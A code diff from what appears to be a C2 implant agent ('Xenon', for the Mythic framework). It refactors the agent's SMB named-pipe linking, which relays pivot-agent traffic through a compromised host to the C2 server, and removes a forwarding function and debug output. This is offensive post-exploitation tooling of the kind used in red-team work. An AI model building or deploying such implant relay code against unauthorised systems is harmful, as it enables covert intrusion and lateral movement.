@@ -37,7 +37,7 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
     UINT32 LinkId = 0;
 
 
-    /* Connect to Pivot Agent */
+    /* Connect to Pivot Agent and Read First Message */
     DWORD Result = 0;
     if ( !LinkAdd(taskUuid, PipeName, &outBuf, &outLen, &LinkId) ) 
     {
@@ -57,58 +57,11 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
 
     PackageQueue(locals);
 
-    /* Track Task ID Link */
-
-    goto END;
-
-
-
-    /* Send P2P Checkin Message to Mythic */
-    // PARSER Response = { 0 };
-    // PackageSend(locals, &Response);
-
-
-    // /* Handle the delegate message back */
-    // PCHAR  P2pUuid          = NULL;
-    // PCHAR  P2pMsg           = NULL;
-    // SIZE_T P2pIdLen         = 0;
-    // SIZE_T P2pMsgLen        = 0;
-    // UINT32 NumOfDelegates   = 0;
-
-    // /* Response should contain a delegate msg for P2P checkin */
-    // BOOL isDelegates = (BOOL)ParserGetByte(&Response);
-    // _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
-    // if ( isDelegates )
-    // {
-    //     NumOfDelegates  = ParserGetInt32(&Response);
-    //     P2pUuid         = ParserStringCopy(&Response, &P2pIdLen);
-    //     P2pMsg          = ParserStringCopy(&Response, &P2pMsgLen);
-
-    //     _dbg("Package should contain : %d msgs.", NumOfDelegates);
-    //     _dbg("P2P New UUID           : %s", P2pUuid);
-    //     _dbg("P2P Raw Msg %d bytes   : %s", P2pMsgLen, P2pMsg);
-
-    //     /* Update Mythic ID for Link */
-    //     xenonConfig->SmbLinks->AgentId = P2pUuid;
-        
-    //     /* Forward Checkin Response to intended Linked Agent */
-    //     LinkForward( P2pMsg, P2pMsgLen );
-    // }
-    // else
-    // {
-    //     _err("No delegates because byte was : 0x%hx", isDelegates);
-    //     goto END;
-    // }
-
-
     /* This agent may now receive delegate messages for Link */
 
 END:
 
-    // PackageDestroy(locals);
-    LocalFree(outBuf);
-    // if (P2pMsg) LocalFree(P2pMsg);
-    // if (&Response) ParserDestroy(&Response);
+    if (outBuf) LocalFree(outBuf);
 
     return;
 }
@@ -271,14 +224,13 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
         return;
 
     _dbg("[LINK SYNC] Buffer:");
-    print_bytes(Response->Buffer, Response->Length);
 
     IsCheckin   = (BOOL)ParserGetByte(Response);
     LinkId      = ParserGetInt32(Response);
     P2pUuid     = ParserStringCopy(Response, &IdLen);
     P2pMsg      = ParserStringCopy(Response, &MsgLen);
 
-    _dbg("[LINK SYNC] Received P2P Response with args: \n\tIsCheckin: %s \n\tLinkId: %x \n\tP2P UUID: %s \n\tP2PMsg: %s", IsCheckin ? "TRUE" : "FALSE", LinkId, P2pUuid, P2pMsg);
+    _dbg("[LINK SYNC] Received P2P Response with args: \n\tIsCheckin: %s \n\tLinkId: %x \n\tP2P UUID: %s \n\tP2PMsg: %d bytes", IsCheckin ? "TRUE" : "FALSE", LinkId, P2pUuid, MsgLen);
 
     /* Find Correct Link and Sync Data */
     PLINKS Current = xenonConfig->SmbLinks;
@@ -334,84 +286,6 @@ CLEANUP:
 
 
 /**
- * @brief Send message to P2P Pipe
- * 
- * @return BOOL
- */
-BOOL LinkForward( PCHAR TaskUuid, PPARSER Response )
-{
-    PCHAR  P2pUuid      = NULL;
-    PCHAR  P2pMsg       = NULL;
-    SIZE_T IdLen        = TASK_UUID_SIZE;
-    SIZE_T MsgLen       = 0;
-    UINT32 LinkId       = 0;
-    BOOL   IsCheckin    = FALSE;
-    BOOL   Success      = FALSE;
-
-    IsCheckin   = (BOOL)ParserGetByte(Response);
-    _dbg("[LINK SYNC] IsCheckin: [%s]", IsCheckin ? "TRUE" : "FALSE");
-    LinkId      = ParserGetInt32(Response);
-    _dbg("[LINK SYNC] LinkId: [%x]", LinkId);
-    P2pUuid     = ParserGetString(Response, &IdLen);
-    P2pMsg      = ParserGetString(Response, &MsgLen);
-
-    _dbg("[LINK FORWARD] Received P2P Msg for Link Agent ID [%s] with %d bytes ", P2pUuid, MsgLen);
-
-    /* Traverse entire list looking for Agent UUID */
-    PLINKS Current = xenonConfig->SmbLinks;
-    PLINKS Prev    = NULL;
-
-    while ( Current )
-    {
-        PLINKS Next = Current->Next;
-
-        /* Update Mythic Agent ID If Checkin */
-        if ( IsCheckin )
-        {
-            if ( Current->LinkId == LinkId )
-            {
-                Current->AgentId = P2pUuid;
-
-                _dbg("[LINK FORWARD] Updated Link Agent ID => [%s]", Current->AgentId);
-            }
-            else
-            {
-                _err("Failed to find the matching Link by LinkID");
-                goto CLEANUP;
-            }
-        }
-
-        /* Search by AgentId and Send Data */
-        if ( strcmp(Current->AgentId, P2pUuid) == 0 )
-        {
-            _dbg("[LINK FORWARD] Syncing %d bytes to Link ID [%x]", MsgLen, Current->AgentId);
-
-            if ( !PackageSendPipe(Current->hPipe, P2pMsg, MsgLen) ) {
-                DWORD error = GetLastError();
-                _err("Failed to write data to pipe. ERROR : %d", error);
-                goto CLEANUP;
-            }
-
-            Success = TRUE;
-            goto CLEANUP;
-        }
-
-        Prev    = Current;
-        Current = Next;
-    }
-
-    Success = TRUE;
-
-CLEANUP:
-
-    LocalFree(P2pMsg);
-    if ( !IsCheckin ) LocalFree(P2pUuid);
-
-    return Success;
-}
-
-
-/**
  * @brief Pushes all Link updates to server
  * 
  * Note - This method does cause extra network requests
@@ -454,9 +328,6 @@ VOID LinkPush()
 
                         if ( ReadFile( TempList->hPipe, Output, Length, &BytesSize, NULL ) )
                         {
-                            // _dbg("Linked Agent -> (Msg %d bytes) -> C2", BytesSize);
-                            // print_bytes(Output, BytesSize);
-
                             /* Verify Our Link ID from the package */
                             PARSER Temp = { 0 };
                             ParserNew(&Temp, Output, BytesSize);
@@ -471,20 +342,16 @@ VOID LinkPush()
                                 Output = NULL;
                                 continue;
                             }
-                            // UINT32 TempId = *(UINT32*)Output;
-                            // Output      += 4;
-                            // BytesSize   -= 4;
+
                             _dbg("Link ID [%x] has message of %d bytes", TempId, BytesSize);
 
                             /* Send Link msg as a delegate type (LINK_MSG) */
-                            // Package = PackageInit( LINK_MSG, TRUE );
                             Package = PackageInit(NULL, FALSE);
                             PackageAddByte(Package, LINK_MSG);
                             PackageAddString(Package, TempList->AgentId, FALSE);
                             PackageAddBytes(Package, Temp.Buffer, Temp.Length, TRUE);
 
                             PackageQueue(Package);
-                            // PackageSend( Package, NULL );
 
                             /* Clean up */
                             ParserDestroy(&Temp);
